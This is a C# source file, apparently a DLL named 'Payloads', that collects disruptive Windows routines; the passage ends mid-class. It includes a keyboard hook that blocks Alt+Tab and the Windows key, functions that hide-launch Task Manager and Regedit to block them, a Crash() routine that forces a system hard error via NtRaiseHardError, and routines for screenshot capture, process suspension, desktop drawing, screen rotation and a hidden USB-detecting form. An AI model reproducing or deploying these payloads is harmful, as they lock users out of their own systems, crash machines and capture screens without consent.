using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Speech.Synthesis;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Reflection;
using System.Management;
using System.ComponentModel;
using Microsoft.Win32.SafeHandles;
using System.IO;

namespace Payloads
{
    public static class StaticPayloads
    {

        /*
         * In this DLL project, i will add the most cool and intresting (and maybe useful) payloads i come across while developing other stuff.
         * How do i add payloads???
         * Follow these simple rules to keep the code as clean as possible.
         * Use ALWAYS regions for each type of payloads, and use separated regions for very large payloads.
         * keep public only the method that runs the payload, all other stuff will be private.
         * Have fun
         */
        #region keyboard hook
        [DllImport("user32.dll", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi)]
        private static extern int SetWindowsHookEx(
           int idHook,
           //LowLevelKeyboardProcDelegate lpfn,
           int hMod,
           int dwThreadId);

        [DllImport("user32.dll")]
        private static extern int UnhookWindowsHookEx(int hHook);

        [DllImport("user32.dll", EntryPoint = "CallNextHookEx", CharSet = CharSet.Ansi)]
        private static extern int CallNextHookEx(
            int hHook, int nCode,
            int wParam, ref KBDLLHOOKSTRUCT lParam);

        const int WH_KEYBOARD_LL = 13;
        private static int intLLKey;
        private static KBDLLHOOKSTRUCT lParam;

        private struct KBDLLHOOKSTRUCT
        {
            public int vkCode;
            int scanCode;
            public int flags;
            int time;
            int dwExtraInfo;
        }

        private static int LowLevelKeyboardProc(
            int nCode, int wParam,
            ref KBDLLHOOKSTRUCT lParam)
        {
            bool blnEat = false;
            switch (wParam)
            {
                case 256:
                case 257:
                case 260:
                case 261:
                    //Alt+Tab, Alt+Esc, Ctrl+Esc, Windows Key
                    if (((lParam.vkCode == 9) && (lParam.flags == 32)) ||
                    ((lParam.vkCode == 27) && (lParam.flags == 32)) || ((lParam.vkCode ==
                    27) && (lParam.flags == 0)) || ((lParam.vkCode == 91) && (lParam.flags
                    == 1)) || ((lParam.vkCode == 92) && (lParam.flags == 1)) || ((true) &&
                    (lParam.flags == 32)))
                    {
                        blnEat = true;
                    }
                    break;
            }

            if (blnEat)
                return 1;
            else return CallNextHookEx(0, nCode, wParam, ref lParam);

        }

        public static void KeyboardHook()
        {
            /*intLLKey = SetWindowsHookEx(WH_KEYBOARD_LL, new LowLevelKeyboardProcDelegate(LowLevelKeyboardProc),
                       Marshal.GetHINSTANCE(
                       Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);*/
        }

        public static void HookAllKeys()
        {
            throw new NotImplementedException("This method isn't been implemented yet but stay tuned because it will soon!");
        }

        public static void UnHookAllKeys()
        {
            throw new NotImplementedException("This method isn't been implemented yet but stay tuned because it will soon!");
        }

        public static void ReleaseKeyboardHook()
        {
            intLLKey = UnhookWindowsHookEx(intLLKey);
        }
        #endregion

        #region Processes
        public static string GetProcessOwner(int processId)
        {
            string query = "Select * From Win32_Process Where ProcessID = " + processId;
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
            ManagementObjectCollection processList = searcher.Get();

            foreach (ManagementObject obj in processList)
            {
                string[] argList = new string[] { string.Empty, string.Empty };
                int returnVal = Convert.ToInt32(obj.InvokeMethod("GetOwner", argList));
                if (returnVal == 0)
                {
                    // return DOMAIN\user
                    return argList[1] + "\\" + argList[0];
                }
            }

            return "NO OWNER";
        }

        public static string GetProcessPath(int processId)
        {
            var wmiQueryString = "SELECT ProcessId, ExecutablePath, CommandLine FROM Win32_Process";
            using (var searcher = new ManagementObjectSearcher(wmiQueryString))
            using (var results = searcher.Get())
            {
                string query = "SELECT ExecutablePath, ProcessID FROM Win32_Process";
                ManagementObjectSearcher psearcher = new ManagementObjectSearcher(query);

                foreach (ManagementObject item in psearcher.Get())
                {
                    object id = item["ProcessID"];
                    object path = item["ExecutablePath"];

                    if (path != null && id.ToString() == processId.ToString())
                    {
                        return path.ToString();
                    }
                }
                return "";
            }
        }

        public static string[] GetAllModules(Process p)
        {
            try
            {
                List<string> s = new List<string>();
                foreach (ProcessModule m in p.Modules)
                {
                    s.Add(m.ModuleName);
                }
                return s.ToArray();
            }
            catch
            {
                return new String[1] { "Error" };
            }
        }

        public static ulong GetPhysicalMemory()
        {
            MEMORYSTATUSEX status = new MEMORYSTATUSEX();
            status.length = Marshal.SizeOf(status);
            if (!GlobalMemoryStatusEx(ref status))
            {
                int err = Marshal.GetLastWin32Error();
                throw new Win32Exception(err);
            }
            return status.totalPhys;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct MEMORYSTATUSEX
        {
            public int length;
            public int memoryLoad;
            public ulong totalPhys;
            public ulong availPhys;
            public ulong totalPageFile;
            public ulong availPageFile;
            public ulong totalVirtual;
            public ulong availVirtual;
            public ulong availExtendedVirtual;
        }
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GlobalMemoryStatusEx(ref MEMORYSTATUSEX buffer);

        public static void KillProcessAndChildren(int pid)
        {
            // Cannot close 'system idle process'.

            if (pid == 0)
            {
                return;
            }
            ManagementObjectSearcher searcher = new ManagementObjectSearcher
                    ("Select * From Win32_Process Where ParentProcessID=" + pid);
            ManagementObjectCollection moc = searcher.Get();
            foreach (ManagementObject mo in moc)
            {
                KillProcessAndChildren(Convert.ToInt32(mo["ProcessID"]));
            }
            try
            {
                Process proc = Process.GetProcessById(pid);
                proc.Kill();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "DontFreezeMe", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public enum ThreadAccess : int
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            SET_INFORMATION = (0x0020),
            QUERY_INFORMATION = (0x0040),
            SET_THREAD_TOKEN = (0x0080),
            IMPERSONATE = (0x0100),
            DIRECT_IMPERSONATION = (0x0200)
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32.dll")]
        static extern uint SuspendThread(IntPtr hThread);
        [DllImport("kernel32.dll")]
        static extern int ResumeThread(IntPtr hThread);
        [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool CloseHandle(IntPtr handle);


        public static void SuspendProcess(int pid)
        {
            try
            {
                var process = Process.GetProcessById(pid); // throws exception if process does not exist

                foreach (ProcessThread pT in process.Threads)
                {
                    IntPtr pOpenThread = OpenThread(ThreadAccess.SUSPEND_RESUME, false, (uint)pT.Id);

                    if (pOpenThread == IntPtr.Zero)
                    {
                        continue;
                    }

                    SuspendThread(pOpenThread);

                    CloseHandle(pOpenThread);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "DontFreezeMe", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public static void ResumeProcess(int pid)
        {
            try
            {
                var process = Process.GetProcessById(pid);

                if (process.ProcessName == string.Empty)
                    return;

                foreach (ProcessThread pT in process.Threads)
                {
                    IntPtr pOpenThread = OpenThread(ThreadAccess.SUSPEND_RESUME, false, (uint)pT.Id);

                    if (pOpenThread == IntPtr.Zero)
                    {
                        continue;
                    }

                    var suspendCount = 0;
                    do
                    {
                        suspendCount = ResumeThread(pOpenThread);
                    } while (suspendCount > 0);

                    CloseHandle(pOpenThread);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "DontFreezeMe", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        #endregion

        #region miscellaneous

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static private extern bool SystemParametersInfo(uint uiAction, uint uiParam, String pvParam, uint fWinIni);

        private const uint SPI_SETDESKWALLPAPER = 0x14;
        private const uint SPIF_UPDATEINIFILE = 0x1;
        private const uint SPIF_SENDWININICHANGE = 0x2;
        public static void BlockTaskMgr()
        {
            ProcessStartInfo psi = new ProcessStartInfo(System.IO.Path.Combine(Environment.SystemDirectory, "taskmgr.exe"));
            psi.RedirectStandardOutput = false;
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.UseShellExecute = true;
            Process.Start(psi);
        }

        public static void BlockRegedit()
        {
            ProcessStartInfo psi = new ProcessStartInfo(System.IO.Path.Combine(Environment.SystemDirectory, "regedit.exe"));
            psi.RedirectStandardOutput = false;
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.UseShellExecute = true;
            Process.Start(psi);
        }

        public static void SetWallpaper(string path, uint flags)
        {
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, flags);
        }

        public static Bitmap TakeScreenShot()
        {
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }
                return bitmap;
            }
        }

        public static void Say(string message)
        {
            SpeechSynthesizer synth = new SpeechSynthesizer();
            synth.SetOutputToDefaultAudioDevice();
            synth.SpeakAsync(message);
        }

        [DllImport("ntdll.dll")]
        private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        public static void Crash()
        {
            Boolean t1;
            uint t2;
            RtlAdjustPrivilege(19, true, false, out t1);
            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
        }
        #endregion

        #region displaysettings


        public enum Orientations
        {
            DEGREES_CW_0 = 0,
            DEGREES_CW_90 = 3,
            DEGREES_CW_180 = 2,
            DEGREES_CW_270 = 1
        }

        public static bool Rotate(uint DisplayNumber, Orientations Orientation)
        {
            bool result = false;
            DISPLAY_DEVICE d = new DISPLAY_DEVICE();
            DEVMODE dm = new DEVMODE();
            d.cb = Marshal.SizeOf(d);

            if (!NativeMethods.EnumDisplayDevices(null, DisplayNumber, ref d, 0))
                throw new ArgumentOutOfRangeException("DisplayNumber", DisplayNumber, "Number is greater than connected displays.");

            if (0 != NativeMethods.EnumDisplaySettings(
                d.DeviceName, NativeMethods.ENUM_CURRENT_SETTINGS, ref dm))
            {
                if ((dm.dmDisplayOrientation + (int)Orientation) % 2 == 1) // Need to swap height and width?
                {
                    int temp = dm.dmPelsHeight;
                    dm.dmPelsHeight = dm.dmPelsWidth;
                    dm.dmPelsWidth = temp;
                }

                switch (Orientation)
                {
                    case Orientations.DEGREES_CW_90:
                        dm.dmDisplayOrientation = NativeMethods.DMDO_270;
                        break;
                    case Orientations.DEGREES_CW_180:
                        dm.dmDisplayOrientation = NativeMethods.DMDO_180;
                        break;
                    case Orientations.DEGREES_CW_270:
                        dm.dmDisplayOrientation = NativeMethods.DMDO_90;
                        break;
                    case Orientations.DEGREES_CW_0:
                        dm.dmDisplayOrientation = NativeMethods.DMDO_DEFAULT;
                        break;
                    default:
                        break;
                }

                DISP_CHANGE ret = NativeMethods.ChangeDisplaySettingsEx(
                    d.DeviceName, ref dm, IntPtr.Zero,
                    DisplaySettingsFlags.CDS_UPDATEREGISTRY, IntPtr.Zero);

                result = ret == 0;
            }

            return result;
        }

        public static void ResetAllDisplayRotations()
        {
            try
            {
                uint i = 0;
                while (++i <= 64)
                {
                    Rotate(i, Orientations.DEGREES_CW_0);
                }
            }
            catch (ArgumentOutOfRangeException)
            {
                // Everything is fine, just reached the last display
            }
        }

        #endregion

        #region Drawing

        [DllImport("user32.dll", ExactSpelling = true, SetLastError = true)]
        private static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll", ExactSpelling = true)]
        private static extern IntPtr ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("user32.dll", EntryPoint = "GetDesktopWindow")]
        private static extern IntPtr GetDesktopWindow();

        public static void DrawBitmapToScreen(Bitmap bmp/*, TernaryRasterOperations operations*/)
        {
            int width = bmp.Width;
            int height = bmp.Height;

            IntPtr hwnd = GetDesktopWindow();
            IntPtr hdc = GetDC(hwnd);
            using (Graphics g = Graphics.FromHdc(hdc))
            {
                g.DrawImage(bmp, new Point(0, 0));
            }

            ReleaseDC(hwnd, hdc);
        }
        #endregion

    }

    public class KeyboardHook
    {
        #region Constant, Structure and Delegate Definitions
        /// <summary>
        /// defines the callback type for the hook
        /// </summary>
        public delegate int keyboardHookProc(int code, int wParam, ref keyboardHookStruct lParam);

        public struct keyboardHookStruct
        {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public int dwExtraInfo;
        }

        const int WH_KEYBOARD_LL = 13;
        const int WM_KEYDOWN = 0x100;
        const int WM_KEYUP = 0x101;
        const int WM_SYSKEYDOWN = 0x104;
        const int WM_SYSKEYUP = 0x105;
        #endregion

        #region Instance Variables
        /// <summary>
        /// The collections of keys to watch for
        /// </summary>
        public List<Keys> HookedKeys = new List<Keys>();
        /// <summary>
        /// Handle to the hook, need this to unhook and call the next hook
        /// </summary>
        IntPtr hhook = IntPtr.Zero;
        keyboardHookProc hookProcDelegate;
        #endregion

        #region Events
        /// <summary>
        /// Occurs when one of the hooked keys is pressed
        /// </summary>
        public event KeyEventHandler KeyDown;
        /// <summary>
        /// Occurs when one of the hooked keys is released
        /// </summary>
        public event KeyEventHandler KeyUp;
        #endregion

        #region Constructors and Destructors
        /// <summary>
        /// Initializes a new instance of the <see cref="globalKeyboardHook"/> class and installs the keyboard hook.
        /// </summary>
        public KeyboardHook()
        {
            hookProcDelegate = hookProc;
            Hook();
        }

        /// <summary>
        /// Releases unmanaged resources and performs other cleanup operations before the
        /// <see cref="globalKeyboardHook"/> is reclaimed by garbage collection and uninstalls the keyboard hook.
        /// </summary>
        ~KeyboardHook()
        {
            UnHook();
        }
        #endregion

        #region Public Methods
        /// <summary>
        /// Installs the global hook
        /// </summary>
        public void Hook()
        {
            IntPtr hInstance = LoadLibrary("User32");
            hhook = SetWindowsHookEx(WH_KEYBOARD_LL, hookProcDelegate, hInstance, 0);
        }

        /// <summary>
        /// Uninstalls the global hook
        /// </summary>
        public void UnHook()
        {
            UnhookWindowsHookEx(hhook);
        }

        /// <summary>
        /// The callback for the keyboard hook
        /// </summary>
        /// <param name="code">The hook code, if it isn't >= 0, the function shouldn't do anyting</param>
        /// <param name="wParam">The event type</param>
        /// <param name="lParam">The keyhook event information</param>
        /// <returns></returns>
        public int hookProc(int code, int wParam, ref keyboardHookStruct lParam)
        {
            if (code >= 0)
            {
                Keys key = (Keys)lParam.vkCode;
                if (HookedKeys.Contains(key))
                {
                    KeyEventArgs kea = new KeyEventArgs(key);
                    if ((wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) && (KeyDown != null))
                    {
                        KeyDown(this, kea);
                    }
                    else if ((wParam == WM_KEYUP || wParam == WM_SYSKEYUP) && (KeyUp != null))
                    {
                        KeyUp(this, kea);
                    }
                    if (kea.Handled)
                        return 1;
                }
            }
            return CallNextHookEx(hhook, code, wParam, ref lParam);
        }
        #endregion

        #region DLL imports
        /// <summary>
        /// Sets the windows hook, do the desired event, one of hInstance or threadId must be non-null
        /// </summary>
        /// <param name="idHook">The id of the event you want to hook</param>
        /// <param name="callback">The callback.</param>
        /// <param name="hInstance">The handle you want to attach the event to, can be null</param>
        /// <param name="threadId">The thread you want to attach the event to, can be null</param>
        /// <returns>a handle to the desired hook</returns>
        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, keyboardHookProc callback, IntPtr hInstance, uint threadId);

        /// <summary>
        /// Unhooks the windows hook.
        /// </summary>
        /// <param name="hInstance">The hook handle that was returned from SetWindowsHookEx</param>
        /// <returns>True if successful, false otherwise</returns>
        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hInstance);

        /// <summary>
        /// Calls the next hook.
        /// </summary>
        /// <param name="idHook">The hook id</param>
        /// <param name="nCode">The hook code</param>
        /// <param name="wParam">The wparam.</param>
        /// <param name="lParam">The lparam.</param>
        /// <returns></returns>
        [DllImport("user32.dll")]
        static extern int CallNextHookEx(IntPtr idHook, int nCode, int wParam, ref keyboardHookStruct lParam);

        /// <summary>
        /// Loads the library.
        /// </summary>
        /// <param name="lpFileName">Name of the library</param>
        /// <returns>A handle to the library</returns>
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);
        #endregion
    }

    #region DisplayStuff
    internal class NativeMethods
    {
        [DllImport("user32.dll")]
        internal static extern DISP_CHANGE ChangeDisplaySettingsEx(
            string lpszDeviceName, ref DEVMODE lpDevMode, IntPtr hwnd,
            DisplaySettingsFlags dwflags, IntPtr lParam);

        [DllImport("user32.dll")]
        internal static extern bool EnumDisplayDevices(
            string lpDevice, uint iDevNum, ref DISPLAY_DEVICE lpDisplayDevice,
            uint dwFlags);

        [DllImport("user32.dll", CharSet = CharSet.Ansi)]
        internal static extern int EnumDisplaySettings(
            string lpszDeviceName, int iModeNum, ref DEVMODE lpDevMode);

        public const int DMDO_DEFAULT = 0;
        public const int DMDO_90 = 1;
        public const int DMDO_180 = 2;
        public const int DMDO_270 = 3;

        public const int ENUM_CURRENT_SETTINGS = -1;

    }

    // See: https://msdn.microsoft.com/en-us/library/windows/desktop/dd183565(v=vs.85).aspx
    [StructLayout(LayoutKind.Explicit, CharSet = CharSet.Ansi)]
    internal struct DEVMODE
    {
        public const int CCHDEVICENAME = 32;
        public const int CCHFORMNAME = 32;

        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = CCHDEVICENAME)]
        [FieldOffset(0)]
        public string dmDeviceName;
        [FieldOffset(32)]
        public Int16 dmSpecVersion;
        [FieldOffset(34)]
        public Int16 dmDriverVersion;
        [FieldOffset(36)]
        public Int16 dmSize;
        [FieldOffset(38)]
        public Int16 dmDriverExtra;
        [FieldOffset(40)]
        public DM dmFields;

        [FieldOffset(44)]
        Int16 dmOrientation;
        [FieldOffset(46)]
        Int16 dmPaperSize;
        [FieldOffset(48)]
        Int16 dmPaperLength;
        [FieldOffset(50)]
        Int16 dmPaperWidth;
        [FieldOffset(52)]
        Int16 dmScale;
        [FieldOffset(54)]
        Int16 dmCopies;
        [FieldOffset(56)]
        Int16 dmDefaultSource;
        [FieldOffset(58)]
        Int16 dmPrintQuality;

        [FieldOffset(44)]
        public POINTL dmPosition;
        [FieldOffset(52)]
        public Int32 dmDisplayOrientation;
        [FieldOffset(56)]
        public Int32 dmDisplayFixedOutput;

        [FieldOffset(60)]
        public short dmColor;
        [FieldOffset(62)]
        public short dmDuplex;
        [FieldOffset(64)]
        public short dmYResolution;
        [FieldOffset(66)]
        public short dmTTOption;
        [FieldOffset(68)]
        public short dmCollate;
        [FieldOffset(72)]
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = CCHFORMNAME)]
        public string dmFormName;
        [FieldOffset(102)]
        public Int16 dmLogPixels;
        [FieldOffset(104)]
        public Int32 dmBitsPerPel;
        [FieldOffset(108)]
        public Int32 dmPelsWidth;
        [FieldOffset(112)]
        public Int32 dmPelsHeight;
        [FieldOffset(116)]
        public Int32 dmDisplayFlags;
        [FieldOffset(116)]
        public Int32 dmNup;
        [FieldOffset(120)]
        public Int32 dmDisplayFrequency;
    }

    // See: https://msdn.microsoft.com/en-us/library/windows/desktop/dd183569(v=vs.85).aspx
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
    internal struct DISPLAY_DEVICE
    {
        [MarshalAs(UnmanagedType.U4)]
        public int cb;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
        public string DeviceName;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
        public string DeviceString;
        [MarshalAs(UnmanagedType.U4)]
        public DisplayDeviceStateFlags StateFlags;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
        public string DeviceID;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
        public string DeviceKey;
    }

    // See: https://msdn.microsoft.com/de-de/library/windows/desktop/dd162807(v=vs.85).aspx
    [StructLayout(LayoutKind.Sequential)]
    internal struct POINTL
    {
        long x;
        long y;
    }

    internal enum DISP_CHANGE : int
    {
        Successful = 0,
        Restart = 1,
        Failed = -1,
        BadMode = -2,
        NotUpdated = -3,
        BadFlags = -4,
        BadParam = -5,
        BadDualView = -6
    }

    // http://www.pinvoke.net/default.aspx/Enums/DisplayDeviceStateFlags.html
    [Flags()]
    internal enum DisplayDeviceStateFlags : int
    {
        /// <summary>The device is part of the desktop.</summary>
        AttachedToDesktop = 0x1,
        MultiDriver = 0x2,
        /// <summary>The device is part of the desktop.</summary>
        PrimaryDevice = 0x4,
        /// <summary>Represents a pseudo device used to mirror application drawing for remoting or other purposes.</summary>
        MirroringDriver = 0x8,
        /// <summary>The device is VGA compatible.</summary>
        VGACompatible = 0x10,
        /// <summary>The device is removable; it cannot be the primary display.</summary>
        Removable = 0x20,
        /// <summary>The device has more display modes than its output devices support.</summary>
        ModesPruned = 0x8000000,
        Remote = 0x4000000,
        Disconnect = 0x2000000
    }

    // http://www.pinvoke.net/default.aspx/user32/ChangeDisplaySettingsFlags.html
    [Flags()]
    internal enum DisplaySettingsFlags : int
    {
        CDS_NONE = 0,
        CDS_UPDATEREGISTRY = 0x00000001,
        CDS_TEST = 0x00000002,
        CDS_FULLSCREEN = 0x00000004,
        CDS_GLOBAL = 0x00000008,
        CDS_SET_PRIMARY = 0x00000010,
        CDS_VIDEOPARAMETERS = 0x00000020,
        CDS_ENABLE_UNSAFE_MODES = 0x00000100,
        CDS_DISABLE_UNSAFE_MODES = 0x00000200,
        CDS_RESET = 0x40000000,
        CDS_RESET_EX = 0x20000000,
        CDS_NORESET = 0x10000000
    }

    [Flags()]
    internal enum DM : int
    {
        Orientation = 0x00000001,
        PaperSize = 0x00000002,
        PaperLength = 0x00000004,
        PaperWidth = 0x00000008,
        Scale = 0x00000010,
        Position = 0x00000020,
        NUP = 0x00000040,
        DisplayOrientation = 0x00000080,
        Copies = 0x00000100,
        DefaultSource = 0x00000200,
        PrintQuality = 0x00000400,
        Color = 0x00000800,
        Duplex = 0x00001000,
        YResolution = 0x00002000,
        TTOption = 0x00004000,
        Collate = 0x00008000,
        FormName = 0x00010000,
        LogPixels = 0x00020000,
        BitsPerPixel = 0x00040000,
        PelsWidth = 0x00080000,
        PelsHeight = 0x00100000,
        DisplayFlags = 0x00200000,
        DisplayFrequency = 0x00400000,
        ICMMethod = 0x00800000,
        ICMIntent = 0x01000000,
        MediaType = 0x02000000,
        DitherType = 0x04000000,
        PanningWidth = 0x08000000,
        PanningHeight = 0x10000000,
        DisplayFixedOutput = 0x20000000
    }
    #endregion

    #region DriveDetector

        /// <summary>
        /// Hidden Form which we use to receive Windows messages about flash drives
        /// </summary>
        internal class DetectorForm : Form
        {
            private Label label1;
            private DriveDetector mDetector = null;

            /// <summary>
            /// Set up the hidden form. 
            /// </summary>
            /// <param name="detector">DriveDetector object which will receive notification about USB drives, see WndProc</param>
            public DetectorForm(DriveDetector detector)
            {
                mDetector = detector;
                this.MinimizeBox = false;
                this.MaximizeBox = false;
                this.ShowInTaskbar = false;
                this.ShowIcon = false;
                this.FormBorderStyle = FormBorderStyle.None;
                this.Load += new System.EventHandler(this.Load_Form);
                this.Activated += new EventHandler(this.Form_Activated);
            }

            private void Load_Form(object sender, EventArgs e)
            {
                // We don't really need this, just to display the label in designer ...
                InitializeComponent();

                // Create really small form, invisible anyway.
                this.Size = new System.Drawing.Size(5, 5);
            }

            private void Form_Activated(object sender, EventArgs e)
            {
                this.Visible = false;
            }

            /// <summary>
            /// This function receives all the windows messages for this window (form).
            /// We call the DriveDetector from here so that is can pick up the messages about
            /// drives arrived and removed.
            /// </summary>
            protected override void WndProc(ref Message m)
            {
                base.WndProc(ref m);

                if (mDetector != null)
                {
                    mDetector.WndProc(ref m);
                }
            }

            private void InitializeComponent()
            {
                this.label1 = new System.Windows.Forms.Label();
                this.SuspendLayout();
                // 
                // label1
                // 
                this.label1.AutoSize = true;
                this.label1.Location = new System.Drawing.Point(13, 30);
                this.label1.Name = "label1";
                this.label1.Size = new System.Drawing.Size(314, 13);
                this.label1.TabIndex = 0;
                this.label1.Text = "This is invisible form. To see DriveDetector code click View Code";
                // 
                // DetectorForm
                // 
                this.ClientSize = new System.Drawing.Size(360, 80);
                this.Controls.Add(this.label1);
                this.Name = "DetectorForm";
                this.ResumeLayout(false);
                this.PerformLayout();

            }
        }   // class DetectorForm


        // Delegate for event handler to handle the device events 
        public delegate void DriveDetectorEventHandler(Object sender, DriveDetectorEventArgs e);

        /// <summary>
        /// Our class for passing in custom arguments to our event handlers 
        /// 
        /// </summary>
        public class DriveDetectorEventArgs : EventArgs
        {


            public DriveDetectorEventArgs()
            {
                Cancel = false;
                Drive = "";
                HookQueryRemove = false;
            }

            /// <summary>
            /// Get/Set the value indicating that the event should be cancelled 
            /// Only in QueryRemove handler.
            /// </summary>
            public bool Cancel;

            /// <summary>
            /// Drive letter for the device which caused this event 
            /// </summary>
            public string Drive;

            /// <summary>
            /// Set to true in your DeviceArrived event handler if you wish to receive the 
            /// QueryRemove event for this drive. 
            /// </summary>
            public bool HookQueryRemove;

        }


        /// <summary>
        /// Detects insertion or removal of removable drives.
        /// Use it in 1 or 2 steps:
        /// 1) Create instance of this class in your project and add handlers for the
        /// DeviceArrived, DeviceRemoved and QueryRemove events.
        /// AND (if you do not want drive detector to creaate a hidden form))
        /// 2) Override WndProc in your form and call DriveDetector's WndProc from there. 
        /// If you do not want to do step 2, just use the DriveDetector constructor without arguments and
        /// it will create its own invisible form to receive messages from Windows.
        /// </summary>
        class DriveDetector : IDisposable
        {
            /// <summary>
            /// Events signalized to the client app.
            /// Add handlers for these events in your form to be notified of removable device events 
            /// </summary>
            public event DriveDetectorEventHandler DeviceArrived;
            public event DriveDetectorEventHandler DeviceRemoved;
            public event DriveDetectorEventHandler QueryRemove;

            /// <summary>
            /// The easiest way to use DriveDetector. 
            /// It will create hidden form for processing Windows messages about USB drives
            /// You do not need to override WndProc in your form.
            /// </summary>
            public DriveDetector()
            {
                DetectorForm frm = new DetectorForm(this);
                frm.Show(); // will be hidden immediatelly
                Init(frm, null);
            }

            /// <summary>
            /// Alternate constructor.
            /// Pass in your Form and DriveDetector will not create hidden form.
            /// </summary>
            /// <param name="control">object which will receive Windows messages. 
            /// Pass "this" as this argument from your form class.</param>
            public DriveDetector(Control control)
            {
                Init(control, null);
            }

            /// <summary>
            /// Consructs DriveDetector object setting also path to file which should be opened
            /// when registering for query remove.  
            /// </summary>
            ///<param name="control">object which will receive Windows messages. 
            /// Pass "this" as this argument from your form class.</param>
            /// <param name="FileToOpen">Optional. Name of a file on the removable drive which should be opened. 
            /// If null, root directory of the drive will be opened. Opening a file is needed for us 
            /// to be able to register for the query remove message. TIP: For files use relative path without drive letter.
            /// e.g. "SomeFolder\file_on_flash.txt"</param>
            public DriveDetector(Control control, string FileToOpen)
            {
                Init(control, FileToOpen);
            }

            /// <summary>
            /// init the DriveDetector object
            /// </summary>
            /// <param name="intPtr"></param>
            private void Init(Control control, string fileToOpen)
            {
                mFileToOpen = fileToOpen;
                mFileOnFlash = null;
                mDeviceNotifyHandle = IntPtr.Zero;
                mRecipientHandle = control.Handle;
                mDirHandle = IntPtr.Zero;   // handle to the root directory of the flash drive which we open 
                mCurrentDrive = "";
            }

            /// <summary>
            /// Gets the value indicating whether the query remove event will be fired.
            /// </summary>
            public bool IsQueryHooked
            {
                get
                {
                    if (mDeviceNotifyHandle == IntPtr.Zero)
                        return false;
                    else
                        return true;
                }
            }

            /// <summary>
            /// Gets letter of drive which is currently hooked. Empty string if none.
            /// See also IsQueryHooked.
            /// </summary>
            public string HookedDrive
            {
                get
                {
                    return mCurrentDrive;
                }
            }

            /// <summary>
            /// Gets the file stream for file which this class opened on a drive to be notified
            /// about it's removal. 
            /// This will be null unless you specified a file to open (DriveDetector opens root directory of the flash drive) 
            /// </summary>
            public FileStream OpenedFile
            {
                get
                {
                    return mFileOnFlash;
                }
            }

            /// <summary>
            /// Hooks specified drive to receive a message when it is being removed.  
            /// This can be achieved also by setting e.HookQueryRemove to true in your 
            /// DeviceArrived event handler. 
            /// By default DriveDetector will open the root directory of the flash drive to obtain notification handle
            /// from Windows (to learn when the drive is about to be removed). 
            /// </summary>
            /// <param name="fileOnDrive">Drive letter or relative path to a file on the drive which should be 
            /// used to get a handle - required for registering to receive query remove messages.
            /// If only drive letter is specified (e.g. "D:\\", root directory of the drive will be opened.</param>
            /// <returns>true if hooked ok, false otherwise</returns>
            public bool EnableQueryRemove(string fileOnDrive)
            {
                if (fileOnDrive == null || fileOnDrive.Length == 0)
                    throw new ArgumentException("Drive path must be supplied to register for Query remove.");

                if (fileOnDrive.Length == 2 && fileOnDrive[1] == ':')
                    fileOnDrive += '\\';        // append "\\" if only drive letter with ":" was passed in.

                if (mDeviceNotifyHandle != IntPtr.Zero)
                {
                    // Unregister first...
                    RegisterForDeviceChange(false, null);
                }

                if (Path.GetFileName(fileOnDrive).Length == 0 || !File.Exists(fileOnDrive))
                    mFileToOpen = null;     // use root directory...
                else
                    mFileToOpen = fileOnDrive;

                RegisterQuery(Path.GetPathRoot(fileOnDrive));
                if (mDeviceNotifyHandle == IntPtr.Zero)
                    return false;   // failed to register

                return true;
            }

            /// <summary>
            /// Unhooks any currently hooked drive so that the query remove 
            /// message is not generated for it.
            /// </summary>
            public void DisableQueryRemove()
            {
                if (mDeviceNotifyHandle != IntPtr.Zero)
                {
                    RegisterForDeviceChange(false, null);
                }
            }


            /// <summary>
            /// Unregister and close the file we may have opened on the removable drive. 
